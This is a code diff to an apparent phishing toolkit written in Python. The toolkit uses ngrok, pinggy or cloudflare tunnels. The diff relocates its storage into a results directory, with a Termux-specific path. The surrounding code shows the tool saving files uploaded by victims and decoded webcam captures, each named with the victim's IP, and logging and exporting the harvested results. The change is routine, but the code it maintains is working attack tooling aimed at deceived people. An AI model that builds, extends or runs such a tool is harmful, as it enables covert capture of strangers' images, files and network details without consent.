@@ -24,6 +24,9 @@ from bs4 import BeautifulSoup
 
 SESSION_FILE = '.phishgen_session.json'
 
+RESULTS_DIR = os.path.join(os.path.expanduser('~'),
+    'storage/documents/PhisoGen_Results' if os.environ.get('PREFIX') else 'Documents/PhisoGen_Results')
+
 TUNNEL_NGROK = "ngrok"
 TUNNEL_PINGGY = "pinggy"
 TUNNEL_CLOUDFLARE = "cloudflare"
@@ -115,7 +118,7 @@ class PhishingGenerator:
             logging.basicConfig(
                 level=logging.ERROR,
                 format='%(asctime)s - %(levelname)s - %(message)s',
-                filename='logs/phishing.log',
+                filename=os.path.join(RESULTS_DIR, 'logs/phishing.log'),
                 filemode='a'
             )
             self.logger = logging.getLogger(__name__)
@@ -126,9 +129,10 @@ class PhishingGenerator:
         
         # Create required directories
         try:
-            for directory in ['captured_images', 'uploaded_files', 'templates']:
-                if not os.path.exists(directory):
-                    os.makedirs(directory)
+            for directory in ['captured_images', 'uploaded_files', 'templates', 'logs']:
+                path = os.path.join(RESULTS_DIR, directory) if directory != 'templates' else directory
+                if not os.path.exists(path):
+                    os.makedirs(path)
         except Exception as e:
             print(f"Error creating directories: {str(e)}")
 
@@ -709,7 +713,7 @@ class PhishingGenerator:
                     
                     for file in uploaded_files:
                         if file:
-                            filename = f"uploaded_files/{int(time.time())}_{victim_ip}_{file.filename}"
+                            filename = os.path.join(RESULTS_DIR, f"uploaded_files/{int(time.time())}_{victim_ip}_{file.filename}")
                             file.save(filename)
                             filenames.append(filename)
                             
@@ -730,7 +734,7 @@ class PhishingGenerator:
                         img_data = data['image'].replace('data:image/jpeg;base64,', '')
                         img_bytes = base64.b64decode(img_data)
                         
-                        filename = f"captured_images/capture_{int(time.time())}_{victim_ip}.jpg"
+                        filename = os.path.join(RESULTS_DIR, f"captured_images/capture_{int(time.time())}_{victim_ip}.jpg")
                         
                         with open(filename, 'wb') as f:
                             f.write(img_bytes)
@@ -805,7 +809,7 @@ class PhishingGenerator:
     def save_result(self, result):
         try:
             self.results.append(result)
-            with open('phishing_results.txt', 'a', encoding='utf-8') as f:
+            with open(os.path.join(RESULTS_DIR, 'phishing_results.txt'), 'a', encoding='utf-8') as f:
                 f.write(f"\n{'='*50}\n")
                 f.write(f"Tipe: {result['type']}\n")
                 f.write(f"IP: {result['ip']}\n")
@@ -1371,7 +1375,7 @@ class PhishingGenerator:
             console.input("\n[green]Press Enter to continue...[/]")
             return
         try:
-            filename = f"export_{int(time.time())}.json"
+            filename = os.path.join(RESULTS_DIR, f"export_{int(time.time())}.json")
             with open(filename, 'w', encoding='utf-8') as f:
                 json.dump(self.results, f, indent=2)
             console.print(f"[green]✓ Results exported to {filename}[/]")
